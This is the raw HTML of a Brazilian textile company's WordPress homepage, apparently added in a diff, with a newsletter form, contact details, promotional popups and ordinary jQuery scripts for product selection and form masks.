+</div></div></div></div></div><div id="pg-7-6"  class="panel-grid panel-has-style" ><div class="panel-row-style panel-row-style-for-7-6" ><div id="pgc-7-6-0"  class="panel-grid-cell" ><div id="panel-7-6-0-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="8" ><div class="textwidget custom-html-widget"><div class="container-confira-ebook" style="max-width: 390px; width: 100%; margin: 0 auto;">
+	<h3 class="azulClaro em2 klavika-bold lineH1 text-center" style="margin: 40px 0 10px;">
+		Assine Nossa Newsletter
+	</h3>
+	<div class="divisor-salmao" style="margin: 0 auto;"></div>
+</div>
+<div>
+	<div role="form" class="wpcf7" id="wpcf7-f273-p7-o1" lang="pt-BR" dir="ltr">
+<div class="screen-reader-response"><p role="status" aria-live="polite" aria-atomic="true"></p> <ul></ul></div>
+<form action="/#wpcf7-f273-p7-o1" method="post" class="wpcf7-form init" novalidate="novalidate" data-status="init">
+<div style="display: none;">
+<input type="hidden" name="_wpcf7" value="273" />
+<input type="hidden" name="_wpcf7_version" value="5.4.2" />
+<input type="hidden" name="_wpcf7_locale" value="pt_BR" />
+<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f273-p7-o1" />
+<input type="hidden" name="_wpcf7_container_post" value="7" />
+<input type="hidden" name="_wpcf7_posted_data_hash" value="" />
+</div>
+<div class="container-geral-news">
+<div class="bloco-input-news">
+<span class="wpcf7-form-control-wrap email"><input type="email" name="email" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email" aria-required="true" aria-invalid="false" placeholder="Seu e-mail" /></span>
+</div>
+<p><input type="submit" value="Enviar" class="wpcf7-form-control wpcf7-submit btn-form-vm" />
+</p></div>
+<input type='hidden' class='wpcf7-pum' value='{"closepopup":false,"closedelay":0,"openpopup":false,"openpopup_id":0}' /><div class="wpcf7-response-output" aria-hidden="true"></div></form></div>
+</div></div></div></div></div></div><div id="pg-7-7"  class="panel-grid panel-has-style" ><div class="bloco-alinhado panel-row-style panel-row-style-for-7-7" ><div id="pgc-7-7-0"  class="panel-grid-cell" ><div id="panel-7-7-0-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="9" ><div class="textwidget custom-html-widget"><div class="container-icons-contacts" style="justify-content: center;">
+	<div class="bloco-icons-contacts bloco-icons-minwdth">
+		<i class="fas fa-map-marker-alt azulEscuro em3"></i>
+	</div>
+	<div class="bloco-text-contacts">
+		<a href="https://goo.gl/maps/nGLgyB2LPJML8PWD7" target="_blank" class="klavika-bold azulEscuro em1" rel="noopener noreferrer">
+			Rua Joaquim Carlos, 1300 – Pari – São Paulo - SP - CEP: 03019-000
+		</a>
+	</div>
+</div></div></div></div><div id="pgc-7-7-1"  class="panel-grid-cell" ><div id="panel-7-7-1-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="10" ><div class="textwidget custom-html-widget"><div class="container-icons-contacts" style="justify-content: center;">
+	<div class="bloco-icons-contacts bloco-icons-minwdth">
+		<i class="fas fa-mobile-alt azulEscuro em3"></i>
+	</div>
+	<div class="bloco-text-contacts">
+		<a href="tel:1133028888" class="klavika-bold azulEscuro em1">
+			(11) 3302-8888
+		</a>
+		<!-- <br>
+		<a href="tel:1133028888" class="klavika-bold azulEscuro em1">
+			(11) 3302-8888
+		</a> -->
+	</div>
+</div></div></div></div><div id="pgc-7-7-2"  class="panel-grid-cell" ><div id="panel-7-7-2-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="11" ><div class="textwidget custom-html-widget"><div class="container-icons-contacts" style="justify-content: center;">
+	<div class="bloco-icons-contacts bloco-icons-minwdth">
+		<i class="far fa-envelope azulEscuro em3"></i>
+	</div>
+	<div class="bloco-text-contacts">
+		<a href="mailto:contato@xttextil.com.br" class="klavika-bold azulEscuro em1">
+			contato@xttextil.com.br
+		</a>
+	</div>
+</div></div></div></div></div></div><div id="pg-7-8"  class="panel-grid panel-no-style" ><div id="pgc-7-8-0"  class="panel-grid-cell" ><div id="panel-7-8-0-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="12" ><div class="textwidget custom-html-widget"><iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3658.1922339099897!2d-46.60998078502285!3d-23.52558738470061!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x94ce58c40a060ebf%3A0x3c0acbdf557b7a52!2sR.%20Joaquim%20Carlos%2C%201300%20-%20Br%C3%A1s%2C%20S%C3%A3o%20Paulo%20-%20SP%2C%2003019-000!5e0!3m2!1spt-BR!2sbr!4v1570469247986!5m2!1spt-BR!2sbr" width="100%" height="400" frameborder="0" style="border:0; display: flex;" allowfullscreen=""></iframe></div></div></div></div></div>	</div><!-- .entry-content -->
+
+	</article><!-- #post-7 -->
+
+		</main><!-- #main -->
+	</div><!-- #primary -->
+
+
+<aside id="secondary" class="widget-area">
+	</aside><!-- #secondary -->
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+<!-- <script src="https://kit.fontawesome.com/69e294efb4.js"></script> -->
+		</div><!-- #content -->
+      <footer id="colophon" class="site-footer" role="contentinfo">
+        <div id="footer-sidebar1">
+          <aside id="siteorigin-panels-builder-2" class="widget-footer widget_siteorigin-panels-builder"><div id="pl-w5f98741625b60"  class="panel-layout" ><div id="pg-w5f98741625b60-0"  class="panel-grid panel-has-style" ><div class="panel-row-style panel-row-style-for-w5f98741625b60-0" ><div id="pgc-w5f98741625b60-0-0"  class="panel-grid-cell" ><div id="panel-w5f98741625b60-0-0-0" class="so-panel widget widget_siteorigin-panels-builder panel-first-child panel-last-child" data-index="0" ><div class="bloco-alinhado panel-widget-style panel-widget-style-for-w5f98741625b60-0-0-0" ><div id="pl-w5f98741625ca8"  class="panel-layout" ><div id="pg-w5f98741625ca8-0"  class="panel-grid panel-has-style" ><div class="panel-row-style panel-row-style-for-w5f98741625ca8-0" ><div id="pgc-w5f98741625ca8-0-0"  class="panel-grid-cell" ><div id="panel-w5f98741625ca8-0-0-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="0" ><div class="textwidget custom-html-widget"><p class="branco margin0 klavika-bold">
+	XT Têxtil Indústria e Comércio de Tecidos Ltda.
+</p>
+<p class="margin0">
+	<a href="https://goo.gl/maps/nGLgyB2LPJML8PWD7" target="_blank" class="branco klavika-light" rel="noopener noreferrer">
+		Rua Joaquim Carlos, 1300 – Brás<br>
+		São Paulo/SP<br>
+		CEP: 03019-000 
+	</a>
+</p>
+<p class="margin0 branco klavika-bold">
+	Telefone: <a href="tel:1133028888" class="branco klavika-bold">(11)</a> <a class="branco klavika-bold" href=tel:1133028888>3302-8888</a>
+</p></div></div></div><div id="pgc-w5f98741625ca8-0-1"  class="panel-grid-cell" ><div id="panel-w5f98741625ca8-0-1-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="1" ><div class="textwidget custom-html-widget"><div class="container-social-footer">
+	<p class="branco klavika-light text-center margin0">
+		SIGA-NOS
+	</p>
+	<p class="margin0 text-center">
+		<a href="https://www.facebook.com/XT-T%C3%AAxtil-Ind%C3%BAstria-e-Com%C3%A9rcio-de-Tecidos-LTDA-221462184686879/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook-f branco em1-5"></i></a>
+		<a href="https://www.instagram.com/xttextil/" target="_blank" rel="noopener noreferrer"><i class="fab fa-instagram branco em1-5"></i></a>
+	</p>
+</div></div></div></div><div id="pgc-w5f98741625ca8-0-2"  class="panel-grid-cell" ><div id="panel-w5f98741625ca8-0-2-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="2" ><div class="textwidget custom-html-widget"><p class="text-right">
+	<img src="/wp-content/uploads/2019/10/logo-xttextil-branco.png" alt="logo xttextil">
+</p></div></div></div></div></div></div></div></div></div></div></div><div id="pg-w5f98741625b60-1"  class="panel-grid panel-has-style" ><div class="panel-row-style panel-row-style-for-w5f98741625b60-1" ><div id="pgc-w5f98741625b60-1-0"  class="panel-grid-cell" ><div id="panel-w5f98741625b60-1-0-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="1" ><div class="textwidget custom-html-widget"><a href="https://firefish.com.br" target="_blank" class="preto klavika-light" style="display: flex; justify-content: center; align-items: center; font-size: 0.8em; text-decoration: none; cursor: pointer; color: #000;" rel="noopener noreferrer">
+	Desenvolvido por: <img style="max-width: 150px;" src="/wp-content/uploads/2019/12/logo-preto-firefish-2.png" alt="Firefish">
+</a></div></div></div></div></div></div></aside>        </div>
+    	</footer><!-- #colophon -->
+
+			<!-- Select dinamico produtos -->
+			<script type="text/javascript">
+				jQuery(document).ready(function(){
+					var i = 1;
+					//Carregando todos produtos primeira vez
+					jQuery.ajax({
+						url: '/consultas.php',
+						type: 'POST',
+						data: {opcao:'produtos'},
+						beforeSend: function(){
+							//jQuery('#mensagem').html('<span class="mensagem">Aguarde, carregando ...</span>');
+							//disableSelect(true);
+						},
+						success: function(data){
+							//jQuery('#mensagem').html('<span class="mensagem">Deu certo ...</span>');
+							var option = '<option>Selecione um produto</option>';
+							option += data;
+							jQuery('#cmbProdutos1').html(option).show();
+						},
+						error: function(data){
+							//jQuery('#mensagem').html('<span class="mensagem">Error ...</span>');
+						}
+					});
+
+					//Adicionar mais campos
+					jQuery('#addMore').click(function(){
+						if(i < 15){
+							i++;
+
+							html = '<div class="container-form-inputs"><div class=""><span class="wpcf7-form-control-wrap prod'+i+'"><select name="prod'+i+'" id="cmbProdutos'+i+'" class="select-prods"><option>Carregando Produtos</option></select></span></div><div class=""><span class="wpcf7-form-control-wrap cor'+i+'"><select name="cor'+i+'" id="cmbCores'+i+'"></select></span></div><div class=""><span class="wpcf7-form-control-wrap qnt'+i+'"><input type="number" name="qnt'+i+'" placeholder="Quantidade"></span></div></div>';
+
+							jQuery('#containerGeralProds').append(html);
+							getAllProdutos();
+						}
+					});
+
+					jQuery(document).on('change','.select-prods',function(){
+			       //code here
+						 a = this.id.match(/\d+/);
+						 //alert(a);
+						 var produtoID = jQuery('#cmbProdutos'+a+'').val();
+						 jQuery.ajax({
+							 url: '/consultas.php',
+							 type: 'POST',
+							 data: {opcao:'cores', postID:produtoID},
+							 beforeSend: function(){
+								 //jQuery('#mensagem').html('<span class="mensagem">Aguarde, carregando ...</span>');
+							 },
+							 success: function(data){
+								 //jQuery('#mensagem').html('<span class="mensagem">Deu certo ...</span>');
+								 var option = '<option>Selecione uma cor</option>';
+								 option += data;
+								 jQuery('#cmbCores'+a+'').html(option).show();
+							 },
+							 error: function(data){
+								 //jQuery('#mensagem').html('<span class="mensagem">Error ...</span>');
+							 }
+						 });
+			       //alert(jQuery(this).attr('id'));
+			    });
+
+					//Funcao carregar todos os produtos
+					function getAllProdutos(){
+						jQuery.ajax({
+							url: '/consultas.php',
+							type: 'POST',
+							data: {opcao:'produtos'},
+							beforeSend: function(){
+								//jQuery('#mensagem').html('<span class="mensagem">Aguarde, carregando ...</span>');
+							},
+							success: function(data){
+								//jQuery('#mensagem').html('<span class="mensagem">Deu certo ...</span>');
+								var option = '<option>Selecione um produto</option>';
+								option += data;
+								jQuery('#cmbProdutos'+i+'').html(option).show();
+							},
+							error: function(data){
+								//jQuery('#mensagem').html('<span class="mensagem">Error ...</span>');
+							}
+						});
+
+					}
+
+					//Fim
+
+					//Adicionar as cores do produto selecionado primeira vez
+					/*jQuery('#cmbProdutos1').change(function(e){
+							var produtoID = jQuery('#cmbProdutos1').val();
+							jQuery.ajax({
+								url: '/consultas.php',
+								type: 'POST',
+								data: {opcao:'cores', postID:produtoID},
+								beforeSend: function(){
+									jQuery('#mensagem').html('<span class="mensagem">Aguarde, carregando ...</span>');
+								},
+								success: function(data){
+									jQuery('#mensagem').html('<span class="mensagem">Deu certo ...</span>');
+									var option = '<option>Selecione uma cor</option>';
+									option += data;
+									jQuery('#cmbCores1').html(option).show();
+								},
+								error: function(data){
+									jQuery('#mensagem').html('<span class="mensagem">Error ...</span>');
+								}
+							});
+					});*/
+				});
+			</script>
+
+			<!-- Color Product Change -->
+			<script type="text/javascript">
+				jQuery('.circle-color').click(function() {
+					var nomeCor = this.id;
+					var valor = jQuery('.valor-color-'+nomeCor).attr('id');
+
+					jQuery('.bloco-cat-img').css("background-color", valor);
+					nomeCor = nomeCor.split(/(?=[A-Z])/).join(" ");
+					jQuery('.titulo-prod-mod').text(nomeCor);
+				});
+			</script>
+
+			<script type="text/javascript">
+				jQuery(document).ready(function(){
+					jQuery(".title").click(function(){
+						jQuery(".content").slideUp("fast");
+						jQuery(this).find('.expand').removeClass('collapse');
+						if(jQuery(this).next().is(":hidden") == true ) {
+							jQuery('.expand').removeClass('collapse');
+							jQuery(this).next().slideDown("normal")
+							jQuery(this).find('.expand').addClass('collapse');
+						}
+					});
+				});
+			</script>
+
+			<script defer type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.0/jquery.mask.js"></script>
+		  <!-- mask -->
+		  <script type="text/javascript">
+		    jQuery(document).ready(function () {
+		      var $cnpj = jQuery(".cnpj");
+		      $cnpj.mask('00.000.000/0000-00');
+
+					var $tel = jQuery(".tel");
+		      $tel.mask('(00) 000000000');
+		    });
+		  </script>
+
+    </div><!-- #page -->
+    <!-- Click to Chat - https://holithemes.com/plugins/click-to-chat/  v2.10.2 -->  
+            <div  onclick="ht_ctc_click(this);" class="ht-ctc ht-ctc-chat style-7 desktop ctc-analytics " 
+                style="display: none; position: fixed; bottom: 30px; right: 30px;"
+                data-return_type="chat" 
+                data-style="7" 
+                data-number="5511987450800" 
+                data-pre_filled="Olá, tenho interesse em malhas, pode me ajudar?" 
+                data-is_ga_enable="no" 
+                data-is_fb_pixel="no" 
+                data-is_fb_an_enable="no" 
+                data-webandapi="webapi" 
+                data-display_mobile="show" 
+                data-display_desktop="show" 
+                data-css="display: none; cursor: pointer; z-index: 99999999;" 
+                data-position="position: fixed; bottom: 30px; right: 30px;" 
+                data-position_mobile="position: fixed; bottom: 30px; right: 30px;" 
+                >
+                <span title="Fale com a nossa equipe de vendas!" class="ctc-analytics ctc-icon ctc-icon-whatsapp2" id="s7-icon" style="font-size: 28px; color: #ffffff; padding: 12px; background-color: #25D366; border-radius: 50%;"
+onmouseover = "this.style.color = '#455a64', this.style.backgroundColor = '#25D366' " 
+onmouseout  = "this.style.color = '#ffffff', this.style.backgroundColor = '#25D366' "
+></span>            </div>
+            <script> try { ht_ctc_loaded(); } catch (e) {} </script>
+            <div id="pum-9439" class="pum pum-overlay pum-theme-1297 pum-theme-default-theme popmake-overlay click_open" data-popmake="{&quot;id&quot;:9439,&quot;slug&quot;:&quot;programacao&quot;,&quot;theme_id&quot;:1297,&quot;cookies&quot;:[],&quot;triggers&quot;:[{&quot;type&quot;:&quot;click_open&quot;,&quot;settings&quot;:{&quot;extra_selectors&quot;:&quot;&quot;,&quot;cookie_name&quot;:null}}],&quot;mobile_disabled&quot;:null,&quot;tablet_disabled&quot;:null,&quot;meta&quot;:{&quot;display&quot;:{&quot;stackable&quot;:false,&quot;overlay_disabled&quot;:false,&quot;scrollable_content&quot;:false,&quot;disable_reposition&quot;:false,&quot;size&quot;:&quot;medium&quot;,&quot;responsive_min_width&quot;:&quot;0%&quot;,&quot;responsive_min_width_unit&quot;:false,&quot;responsive_max_width&quot;:&quot;100%&quot;,&quot;responsive_max_width_unit&quot;:false,&quot;custom_width&quot;:&quot;640px&quot;,&quot;custom_width_unit&quot;:false,&quot;custom_height&quot;:&quot;380px&quot;,&quot;custom_height_unit&quot;:false,&quot;custom_height_auto&quot;:false,&quot;location&quot;:&quot;center top&quot;,&quot;position_from_trigger&quot;:false,&quot;position_top&quot;:&quot;100&quot;,&quot;position_left&quot;:&quot;0&quot;,&quot;position_bottom&quot;:&quot;0&quot;,&quot;position_right&quot;:&quot;0&quot;,&quot;position_fixed&quot;:false,&quot;animation_type&quot;:&quot;fade&quot;,&quot;animation_speed&quot;:&quot;350&quot;,&quot;animation_origin&quot;:&quot;center top&quot;,&quot;overlay_zindex&quot;:false,&quot;zindex&quot;:&quot;1999999999&quot;},&quot;close&quot;:{&quot;text&quot;:&quot;&quot;,&quot;button_delay&quot;:&quot;0&quot;,&quot;overlay_click&quot;:false,&quot;esc_press&quot;:false,&quot;f4_press&quot;:false},&quot;click_open&quot;:[]}}" role="dialog" aria-hidden="true" >
+
+	<div id="popmake-9439" class="pum-container popmake theme-1297 pum-responsive pum-responsive-medium responsive size-medium">
+
+				
+
+				
+
+		
+
+				<div class="pum-content popmake-content">
+			<p><img loading="lazy" src="http://wp.xttextil.net/wp-content/uploads/2022/12/Programacao-Post-para-Instagram-Quadrado-300x300.jpg" alt="" width="300" height="300" class="alignnone size-medium wp-image-9437" srcset="http://wp.xttextil.net/wp-content/uploads/2022/12/Programacao-Post-para-Instagram-Quadrado-300x300.jpg 300w, http://wp.xttextil.net/wp-content/uploads/2022/12/Programacao-Post-para-Instagram-Quadrado-1024x1024.jpg 1024w, http://wp.xttextil.net/wp-content/uploads/2022/12/Programacao-Post-para-Instagram-Quadrado-150x150.jpg 150w, http://wp.xttextil.net/wp-content/uploads/2022/12/Programacao-Post-para-Instagram-Quadrado-768x768.jpg 768w, http://wp.xttextil.net/wp-content/uploads/2022/12/Programacao-Post-para-Instagram-Quadrado.jpg 1080w" sizes="(max-width: 300px) 100vw, 300px" /></p>
+		</div>
+
+
+				
+
+				            <button type="button" class="pum-close popmake-close" aria-label="Close">
+			X            </button>
+		
+	</div>
+
+</div>
+<div id="pum-6780" class="pum pum-overlay pum-theme-1297 pum-theme-default-theme popmake-overlay pum-click-to-close auto_open click_open" data-popmake="{&quot;id&quot;:6780,&quot;slug&quot;:&quot;15-anos-2&quot;,&quot;theme_id&quot;:1297,&quot;cookies&quot;:[{&quot;event&quot;:&quot;on_popup_close&quot;,&quot;settings&quot;:{&quot;name&quot;:&quot;pum-6780&quot;,&quot;key&quot;:&quot;&quot;,&quot;session&quot;:false,&quot;time&quot;:&quot;1 month&quot;,&quot;path&quot;:&quot;1&quot;}}],&quot;triggers&quot;:[{&quot;type&quot;:&quot;auto_open&quot;,&quot;settings&quot;:{&quot;cookie_name&quot;:[&quot;pum-6780&quot;],&quot;delay&quot;:&quot;500&quot;}},{&quot;type&quot;:&quot;click_open&quot;,&quot;settings&quot;:{&quot;extra_selectors&quot;:&quot;&quot;,&quot;cookie_name&quot;:null}}],&quot;mobile_disabled&quot;:null,&quot;tablet_disabled&quot;:null,&quot;meta&quot;:{&quot;display&quot;:{&quot;stackable&quot;:false,&quot;overlay_disabled&quot;:false,&quot;scrollable_content&quot;:false,&quot;disable_reposition&quot;:false,&quot;size&quot;:&quot;medium&quot;,&quot;responsive_min_width&quot;:&quot;0%&quot;,&quot;responsive_min_width_unit&quot;:false,&quot;responsive_max_width&quot;:&quot;100%&quot;,&quot;responsive_max_width_unit&quot;:false,&quot;custom_width&quot;:&quot;640px&quot;,&quot;custom_width_unit&quot;:false,&quot;custom_height&quot;:&quot;380px&quot;,&quot;custom_height_unit&quot;:false,&quot;custom_height_auto&quot;:false,&quot;location&quot;:&quot;center top&quot;,&quot;position_from_trigger&quot;:false,&quot;position_top&quot;:&quot;100&quot;,&quot;position_left&quot;:&quot;0&quot;,&quot;position_bottom&quot;:&quot;0&quot;,&quot;position_right&quot;:&quot;0&quot;,&quot;position_fixed&quot;:false,&quot;animation_type&quot;:&quot;fade&quot;,&quot;animation_speed&quot;:&quot;350&quot;,&quot;animation_origin&quot;:&quot;center top&quot;,&quot;overlay_zindex&quot;:false,&quot;zindex&quot;:&quot;1999999999&quot;},&quot;close&quot;:{&quot;text&quot;:&quot;&quot;,&quot;button_delay&quot;:&quot;0&quot;,&quot;overlay_click&quot;:&quot;1&quot;,&quot;esc_press&quot;:&quot;1&quot;,&quot;f4_press&quot;:&quot;1&quot;},&quot;click_open&quot;:[]}}" role="dialog" aria-hidden="true" >
+
+	<div id="popmake-6780" class="pum-container popmake theme-1297 pum-responsive pum-responsive-medium responsive size-medium">
+
+				
+
+				
+
+		
+
+				<div class="pum-content popmake-content">
+			<p><img loading="lazy" class="size-medium wp-image-6781 aligncenter" src="http://wp.xttextil.net/wp-content/uploads/2021/09/REVISTA___-02-300x300.jpg" alt="" width="800" height="800" srcset="http://wp.xttextil.net/wp-content/uploads/2021/09/REVISTA___-02-300x300.jpg 300w, http://wp.xttextil.net/wp-content/uploads/2021/09/REVISTA___-02-1024x1024.jpg 1024w, http://wp.xttextil.net/wp-content/uploads/2021/09/REVISTA___-02-150x150.jpg 150w, http://wp.xttextil.net/wp-content/uploads/2021/09/REVISTA___-02-768x768.jpg 768w, http://wp.xttextil.net/wp-content/uploads/2021/09/REVISTA___-02-1536x1536.jpg 1536w, http://wp.xttextil.net/wp-content/uploads/2021/09/REVISTA___-02-2048x2048.jpg 2048w" sizes="(max-width: 800px) 100vw, 800px" /></p>
+		</div>
+
+
+				
+
+				            <button type="button" class="pum-close popmake-close" aria-label="Close">
+			X            </button>
+		
+	</div>
+
+</div>
+<script type="text/javascript">
+document.addEventListener( 'wpcf7mailsent', function( event ) {
+    if ( '152' == event.detail.contactFormId ) {// Form de contato
+      gtag_report_conversionFC();
+			gtag('event', 'Falar', { 'event_category' : 'Contato', 'event_label' : 'Formulario', 'value': 1 });
+    } else if ('590' == event.detail.contactFormId || '762' == event.detail.contactFormId) {// Form produto
+			gtag_report_conversionFP();
+			gtag('event', 'Contatar', { 'event_category' : 'Orcamento', 'event_label' : 'Formulario', 'value': 1 });
+		}
+}, false );
+</script>
+<div class="mobmenu-overlay"></div><div class="mob-menu-header-holder mobmenu"  data-menu-display="mob-menu-slideout" data-open-icon="down-open" data-close-icon="up-open"><div class="mob-menu-logo-holder"><a href="http://wp.xttextil.net" class="headertext"><img class="mob-standard-logo" src="http://wp.xttextil.net/wp-content/uploads/2019/09/Vector-Smart-Object.png"  alt="Xttextil"><img class="mob-retina-logo" src="http://wp.xttextil.net/wp-content/uploads/2019/09/Vector-Smart-Object.png"  alt=" Logo Header Menu"></a></div><div class="mobmenur-container"><a href="#" class="mobmenu-right-bt  mobmenu-trigger-action" data-panel-target="mobmenu-right-panel" aria-label="Right Menu Button"><i class="mob-icon-menu mob-menu-icon"></i><i class="mob-icon-cancel-1 mob-cancel-button"></i></a></div></div>				<div class="mobmenu-right-alignment mobmenu-panel mobmenu-right-panel  ">
+				<a href="#" class="mobmenu-right-bt" aria-label="Right Menu Button"><i class="mob-icon-cancel-1 mob-cancel-button"></i></a>
+										<div class="mobmenu-content">
+							<ul class="rightmtop">
+									</ul>
+			<div class="menu-menu-1-container"><ul id="mobmenuright" role="navigation" aria-label="Main navigation for mobile devices"><li  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-7 current_page_item menu-item-9"><a href="http://wp.xttextil.net/" class="">Home</a></li><li  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-39"><a href="http://wp.xttextil.net/quem-somos/" class="">Quem Somos</a></li><li  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109"><a href="http://wp.xttextil.net/produtos/" class="">Produtos</a></li><li  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-214"><a href="http://wp.xttextil.net/blog/" class="">Blog</a></li><li  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2076"><a href="http://wp.xttextil.net/e-books/" class="">E-Books</a></li><li  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3288"><a href="http://wp.xttextil.net/cartela-de-cores/" class="">Cartela de Cores</a></li><li  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-151"><a href="http://wp.xttextil.net/contato/" class="">Contato</a></li></ul></div>
+			</div><div class="mob-menu-right-bg-holder"></div></div>
+
+		                <style type="text/css" media="all"
+                       id="siteorigin-panels-layouts-footer">/* Layout w5f98741625ca8 */ #pgc-w5f98741625ca8-0-0 , #pgc-w5f98741625ca8-0-2 { width:36%;width:calc(36% - ( 0.64 * 30px ) ) } #pgc-w5f98741625ca8-0-1 { width:28%;width:calc(28% - ( 0.72 * 30px ) ) } #pl-w5f98741625ca8 .so-panel { margin-bottom:30px } #pl-w5f98741625ca8 .so-panel:last-child { margin-bottom:0px } #pg-w5f98741625ca8-0> .panel-row-style { align-items:center !important } #pg-w5f98741625ca8-0.panel-no-style, #pg-w5f98741625ca8-0.panel-has-style > .panel-row-style { -webkit-align-items:flex-start;align-items:flex-start } #pgc-w5f98741625ca8-0-2 { align-self:auto } @media (max-width:780px){ #pg-w5f98741625ca8-0.panel-no-style, #pg-w5f98741625ca8-0.panel-has-style > .panel-row-style { -webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column } #pg-w5f98741625ca8-0 > .panel-grid-cell , #pg-w5f98741625ca8-0 > .panel-row-style > .panel-grid-cell { width:100%;margin-right:0 } #pgc-w5f98741625ca8-0-0 , #pgc-w5f98741625ca8-0-1 { margin-bottom:30px } #pg-w5f98741625ca8-0 { margin-bottom:px } #pl-w5f98741625ca8 .panel-grid-cell { padding:0 } #pl-w5f98741625ca8 .panel-grid .panel-grid-cell-empty { display:none } #pl-w5f98741625ca8 .panel-grid .panel-grid-cell-mobile-last { margin-bottom:0px }  } /* Layout w5f98741625b60 */ #pgc-w5f98741625b60-0-0 , #pgc-w5f98741625b60-1-0 { width:100%;width:calc(100% - ( 0 * 30px ) ) } #pg-w5f98741625b60-0 , #pl-w5f98741625b60 .so-panel:last-child { margin-bottom:0px } #pl-w5f98741625b60 .so-panel { margin-bottom:30px } #pg-w5f98741625b60-0> .panel-row-style { background-color:#cc1b06;padding:20px 10px 20px 10px } #pg-w5f98741625b60-0.panel-no-style, #pg-w5f98741625b60-0.panel-has-style > .panel-row-style , #pg-w5f98741625b60-1.panel-no-style, #pg-w5f98741625b60-1.panel-has-style > .panel-row-style { -webkit-align-items:flex-start;align-items:flex-start } #pg-w5f98741625b60-1> .panel-row-style { padding:10px 10px 10px 10px } @media (max-width:780px){ #pg-w5f98741625b60-0.panel-no-style, #pg-w5f98741625b60-0.panel-has-style > .panel-row-style , #pg-w5f98741625b60-1.panel-no-style, #pg-w5f98741625b60-1.panel-has-style > .panel-row-style { -webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column } #pg-w5f98741625b60-0 > .panel-grid-cell , #pg-w5f98741625b60-0 > .panel-row-style > .panel-grid-cell , #pg-w5f98741625b60-1 > .panel-grid-cell , #pg-w5f98741625b60-1 > .panel-row-style > .panel-grid-cell { width:100%;margin-right:0 } #pg-w5f98741625b60-0 , #pg-w5f98741625b60-1 { margin-bottom:px } #pl-w5f98741625b60 .panel-grid-cell { padding:0 } #pl-w5f98741625b60 .panel-grid .panel-grid-cell-empty { display:none } #pl-w5f98741625b60 .panel-grid .panel-grid-cell-mobile-last { margin-bottom:0px }  } </style><link rel='stylesheet' id='ht_ctc_font_css-css'  href='http://wp.xttextil.net/wp-content/plugins/click-to-chat-for-whatsapp/new/inc/assets/css/font.css?ver=2.10.2' type='text/css' media='all' />
+<script type='text/javascript' src='http://wp.xttextil.net/wp-content/plugins/click-to-chat-for-whatsapp/new/inc/assets/js/app.js?ver=2.10.2' id='ht_ctc_app_js-js'></script>
+<script type='text/javascript' src='http://wp.xttextil.net/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=7.4.4' id='wp-polyfill-js'></script>
+<script type='text/javascript' id='wp-polyfill-js-after'>
+( 'fetch' in window ) || document.write( '<script src="http://wp.xttextil.net/wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js?ver=3.0.0"></scr' + 'ipt>' );( document.contains ) || document.write( '<script src="http://wp.xttextil.net/wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.DOMRect ) || document.write( '<script src="http://wp.xttextil.net/wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.URL && window.URL.prototype && window.URLSearchParams ) || document.write( '<script src="http://wp.xttextil.net/wp-includes/js/dist/vendor/wp-polyfill-url.min.js?ver=3.6.4"></scr' + 'ipt>' );( window.FormData && window.FormData.prototype.keys ) || document.write( '<script src="http://wp.xttextil.net/wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js?ver=3.0.12"></scr' + 'ipt>' );( Element.prototype.matches && Element.prototype.closest ) || document.write( '<script src="http://wp.xttextil.net/wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js?ver=2.0.2"></scr' + 'ipt>' );
+</script>
+<script type='text/javascript' id='contact-form-7-js-extra'>
+/* <![CDATA[ */
+var wpcf7 = {"api":{"root":"http:\/\/wp.xttextil.net\/wp-json\/","namespace":"contact-form-7\/v1"}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://wp.xttextil.net/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>
+<script type='text/javascript' id='lsow-frontend-scripts-js-extra'>
+/* <![CDATA[ */
+var lsow_settings = {"mobile_width":"780","custom_css":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://wp.xttextil.net/wp-content/plugins/livemesh-siteorigin-widgets/assets/js/lsow-frontend.min.js?ver=2.7.0' id='lsow-frontend-scripts-js'></script>
+<script type='text/javascript' src='http://wp.xttextil.net/wp-content/themes/xttextil/js/navigation.js?ver=20151215' id='xttextil-navigation-js'></script>
